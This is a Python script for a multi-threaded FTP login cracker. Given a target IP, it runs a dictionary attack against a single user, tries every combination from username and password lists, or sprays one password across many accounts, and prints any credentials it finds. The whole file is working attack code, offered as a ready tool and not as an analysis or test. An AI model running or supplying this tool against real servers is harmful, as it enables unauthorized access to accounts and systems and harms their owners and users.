import ftplib
from concurrent.futures import ThreadPoolExecutor
import argparse
import os

parser = argparse.ArgumentParser(epilog="(M)ulti-(T)hreaded (F)TP (C)racker")


parser.add_argument("--target", '-t', required=True,type=str, help='target ip address')
parser.add_argument("--port", type=int, default=21,help='ftp port')
parser.add_argument("--user", '-U', type=str, help='username to use')
parser.add_argument("--password", '-P', type=str, help='password to use')
parser.add_argument("--usernames", '-u', type=str, help='usernames list to use')
parser.add_argument("--passwords", '-p', type=str, help='passwords list to use')
parser.add_argument("--threads", type=int, default=100,help='threads to use, default=100')

args=parser.parse_args()

found = []

print(f'[*] initializing engine with ({args.threads}) threads')

def connect(u,p): # main function
	ftpclient = ftplib.FTP(timeout=0.4)
	connection = ftpclient.connect(args.target, args.port)
	try:
		login = ftpclient.login(user=u,passwd=p)
		if "Login successful" in login:
			print(f'[*] credentials found: {u}:{p}')
			found.append(1)
			os._exit(-1)
	except Exception as e:
		if str(e) == "530 Authentication failed.":
			pass
		if str(e) == "timed out" :
			pass
		else:
			os._exit(f'unexcpected ERROR: {str(e)}')


if args.user and args.passwords:  # standard password bruteforce
	print('[*] mode: dictionary attack')
	username = args.user
	passwords_wordlist = args.passwords
	file = open(passwords_wordlist, 'r', encoding='latin1').readlines()
	passwords = [line.strip() for line in file]
	print(f'[*] working with {len(file)}')
	print('\t')
	print(f'[*] Bruteforcing ({args.user}) ....')
	with ThreadPoolExecutor(args.threads) as ex:
		r = [ex.submit(connect, username,password) for password in passwords]

	if not found:
		print('[-] password not found !')


if args.usernames and args.passwords: # iterating through users and passwords 
	print('[*] mode: iteration')

	password_wordlist = args.passwords
	users_wordlist = args.usernames

	userlist = open(users_wordlist ,'r', encoding='latin1').readlines()
	users = [u.strip() for u in userlist] # using list comprehnsion for performance improvment

	passlist = open(password_wordlist ,'r', encoding='latin1').readlines()
	passwords = [p.strip() for p in passlist] # using list comprehnsion for performance improvment
	print(f'[*] working with {len(userlist)} usernames')
	print(f'[*] working with {len(passlist)} passwords\n')
	print('\n[*] Bruteforcing....')
	if args.threads > 100:
		print('[!] you are using more than 100 threads with the (--usernames) and (--passwords) flags results may not be accurate !')
		print('[!] 100 threads is recommended with this mode \n')

	with ThreadPoolExecutor(args.threads) as executer: # running with multiple threads at one time for speed enhancing

		result = [executer.submit(connect, user, password) for user in users for password in passwords]

	if not found:
		print('[-] there is no user:password match in the files')


if args.password and args.usernames: # password spraying 
	print('[*] mode: password spray')
	users_wordlist = args.usernames
	userlist = open(users_wordlist ,'r', encoding='latin1').readlines()
	users = [u.strip() for u in userlist] # using list comprehnsion for performance improvment

	print(f'[*] working with {len(userlist)} usernames')
	print(f'\n[*] spraying...')

	with ThreadPoolExecutor(args.threads) as executer: # running with multiple threads at one time for speed enhancing

		result = [executer.submit(connect, user, args.password) for user in users]

	if not found:
		print(f'[-] no user matched with password: {args.password}')